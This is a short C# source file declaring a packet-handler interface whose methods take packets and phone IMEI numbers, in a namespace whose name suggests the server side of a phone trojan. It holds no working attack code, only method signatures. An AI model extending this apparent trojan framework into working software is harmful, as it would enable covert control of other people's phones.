using InOut;

namespace IIE.Phone.Troj.Host.Handler
{
    public interface IPacketHandler
    {
         void Receive(IPacket p, string imei);
         void HandlePacket(IPacket p, string tempIMEI, Server c);
    }
}
